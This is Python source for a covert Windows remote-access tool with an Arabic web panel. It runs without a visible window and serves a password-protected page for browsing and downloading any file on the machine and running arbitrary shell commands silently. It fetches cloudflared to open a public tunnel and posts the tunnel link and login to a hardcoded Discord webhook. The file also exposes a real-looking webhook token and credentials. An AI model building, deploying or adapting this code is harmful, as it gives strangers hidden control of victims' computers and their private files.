import json
import os
import re
import subprocess
import threading
import time
import urllib.parse
import urllib.request
from flask import Flask, Response, jsonify, render_template_string, request, send_file

# ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1553398382184239174/o5AgtxaHJhFmSRFmbq6bsfTYdro1PiBv4wDhonY_ENBvyXa6IQJeXQvJ__hgLWv77LkT"

# ===== 2. بيانات الأمان =====
USERNAME = "3anoor-Omda"
PASSWORD = "116962672015552"

CREATE_NO_WINDOW = 0x08000000

app = Flask(__name__)

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def authenticate():
    return Response(
        'Login Required',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'},
    )

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مدير الجهاز عن بُعد</title>
    <style>
        body { font-family: system-ui, sans-serif; background: #121212; color: #fff; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        h2 { border-bottom: 2px solid #333; padding-bottom: 10px; color: #4CAF50; }
        .section { background: #1e1e1e; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        .breadcrumb { font-family: monospace; background: #2a2a2a; padding: 10px; border-radius: 5px; margin-bottom: 15px; word-break: break-all; }
        ul { list-style: none; padding: 0; margin: 0; }
        li { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        li:hover { background: #2a2a2a; }
        a { color: #64B5F6; text-decoration: none; cursor: pointer; }
        a:hover { text-decoration: underline; }
        button { background: #4CAF50; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #45a049; }
        input[type="text"] { width: 70%; padding: 8px; border-radius: 4px; border: 1px solid #444; background: #222; color: #fff; }
        .cmd-box { display: flex; gap: 10px; }
        pre { background: #000; color: #00ff00; padding: 10px; border-radius: 5px; overflow-x: auto; max-height: 200px; }
        
        #permission-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 9999; }
        .modal-content { background: #1e1e1e; padding: 25px; border-radius: 10px; text-align: center; max-width: 400px; width: 90%; border: 1px solid #333; }
        .modal-content p { color: #ddd; font-size: 16px; line-height: 1.6; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div id="permission-modal">
        <div class="modal-content">
            <h3>⚠️ طلب إذن الوصول</h3>
            <p>يطلب هذا التطبيق إذن الوصول إلى ملفات وأقراص النظام لتصفحها وتحميلها عن بُعد. هل تود المتابعة؟</p>
            <button onclick="grantPermission()">موافق، السماح بالوصول</button>
        </div>
    </div>

    <div class="container">
        <h2>📁 تصفح الملفات والتحكم الصامت</h2>
        <div class="section">
            <h3>تصفح الأقراص والملفات</h3>
            <div class="breadcrumb" id="current-path">C:\\</div>
            <ul id="file-list"></ul>
        </div>

        <div class="section">
            <h3>تنفيذ أمر في الخلفية (CMD)</h3>
            <div class="cmd-box">
                <input type="text" id="cmd-input" placeholder="مثال: dir أو ipconfig أو shutdown /s /t 3600">
                <button onclick="runCmd()">تنفيذ</button>
            </div>
            <pre id="cmd-output" style="display:none;"></pre>
        </div>
    </div>

    <script>
        let currentPath = "C:\\\\";

        function grantPermission() {
            document.getElementById('permission-modal').style.display = 'none';
            loadFiles(currentPath);
        }

        function loadFiles(path) {
            fetch('/api/files?path=' + encodeURIComponent(path))
            .then(res => res.json())
            .then(data => {
                if(data.error) { alert(data.error); return; }
                currentPath = data.current_path;
                document.getElementById('current-path').innerText = currentPath;
                const list = document.getElementById('file-list');
                list.innerHTML = '';

                if(data.parent) {
                    list.innerHTML += `<li>📂 <a onclick="loadFiles('${escapePath(data.parent)}')">.. (المجلد الأعلى)</a> <span></span></li>`;
                }

                data.items.forEach(item => {
                    if(item.is_dir) {
                        list.innerHTML += `<li>📁 <a onclick="loadFiles('${escapePath(item.path)}')">${item.name}</a> <span>مجلد</span></li>`;
                    } else {
                        list.innerHTML += `<li>📄 ${item.name} <a href="/api/download?path=${encodeURIComponent(item.path)}" target="_blank"><button>تحميل</button></a></li>`;
                    }
                });
            });
        }

        function escapePath(path) {
            return path.replace(/\\\\/g, '\\\\\\\\');
        }

        function runCmd() {
            const cmd = document.getElementById('cmd-input').value;
            if(!cmd) return;
            const output = document.getElementById('cmd-output');
            output.style.display = 'block';
            output.innerText = 'جاري التنفيذ...';

            fetch('/api/cmd', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: cmd})
            })
            .then(res => res.json())
            .then(data => {
                output.innerText = data.output || data.error;
            });
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/files')
def list_files():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    req_path = request.args.get('path', 'C:\\')
    if not os.path.exists(req_path):
        req_path = 'C:\\'

    try:
        items = []
        for entry in os.scandir(req_path):
            try:
                items.append({
                    'name': entry.name,
                    'path': entry.path,
                    'is_dir': entry.is_dir()
                })
            except Exception:
                continue

        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        parent = os.path.dirname(os.path.abspath(req_path))
        if parent == req_path:
            parent = None

        return jsonify({'current_path': req_path, 'parent': parent, 'items': items})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/download')
def download_file():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    file_path = request.args.get('path')
    if file_path and os.path.isfile(file_path):
        return send_file(file_path, as_attachment=True)
    return 'الملف غير موجود', 404

@app.route('/api/cmd', methods=['POST'])
def run_command():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    cmd = request.json.get('command')
    if not cmd:
        return jsonify({'error': 'لم يتم إدخال أمر'}), 400

    try:
        output = subprocess.check_output(
            cmd,
            shell=True,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
            timeout=10,
        )
        try:
            text = output.decode('utf-8')
        except UnicodeDecodeError:
            text = output.decode('cp1256', errors='ignore')
        return jsonify({'output': text})
    except Exception as e:
        return jsonify({'error': str(e)})

def send_to_discord(public_url):
    if not WEBHOOK_URL or "discord" not in WEBHOOK_URL:
        return

    payload = {
        "embeds": [
            {
                "title": "📁 تم تشغيل تطبيق الوصول للملفات (بدون شاشة)!",
                "color": 3066993,
                "fields": [
                    {
                        "name": "🔗 رابط اللوحة",
                        "value": f"[اضغط هنا لفتح مدير الملفات]({public_url})\n`{public_url}`"
                    },
                    {
                        "name": "👤 اسم المستخدم",
                        "value": f"`{USERNAME}`",
                        "inline": True
                    },
                    {
                        "name": "🔑 كلمة السر",
                        "value": f"`{PASSWORD}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "File Access App • تم إزالة الشير سكرين وإضافة طلب الإذن"
                }
            }
        ]
    }

    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        )
        urllib.request.urlopen(req)
    except Exception:
        pass

def start_tunnel(port):
    time.sleep(1)
    temp_dir = os.environ.get("TEMP", os.getcwd())
    cf_exe = os.path.join(temp_dir, "cloudflared.exe")

    if not os.path.exists(cf_exe):
        try:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            urllib.request.urlretrieve(url, cf_exe)
        except Exception:
            return

    try:
        cmd = [cf_exe, "tunnel", "--url", f"http://localhost:{port}"]
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="ignore",
            bufsize=1,
            creationflags=CREATE_NO_WINDOW,
        )

        for line in iter(proc.stdout.readline, ""):
            if "trycloudflare.com" in line:
                match = re.search(r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line)
                if match:
                    send_to_discord(match.group(0))
                    break
    except Exception:
        pass

if __name__ == "__main__":
    PORT = 8080
    threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()

    from gevent.pywsgi import WSGIServer
    http_server = WSGIServer(('0.0.0.0', PORT), app)
    http_server.serve_forever()
